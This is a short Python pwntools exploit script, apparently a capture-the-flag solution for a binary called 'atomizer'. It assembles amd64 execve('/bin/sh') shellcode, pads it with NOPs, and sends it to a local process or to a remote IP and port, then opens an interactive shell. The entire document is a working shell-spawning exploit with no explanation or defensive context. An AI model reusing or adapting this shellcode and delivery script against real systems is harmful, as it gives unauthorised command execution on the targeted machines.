#!/usr/bin/env python3

from pwn import *
context.arch = 'amd64'
exe = ELF("./atomizer")
shellcode = bytes(asm('''mov rax, 0x68732f6e69622f
	push rax
	push rsp
	pop rdi
	xor eax, eax
	push rax
	mov al, 59
	push rsp
	pop rdx
	push rsp
	pop rsi
	syscall'''))
#print(len(shellcode))
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("52.59.124.14",5020)

    return r


def main():
    r = conn()
    pause()
    r.sendline(shellcode  + asm('nop') * 69)
    r.interactive()


if __name__ == "__main__":
    main()
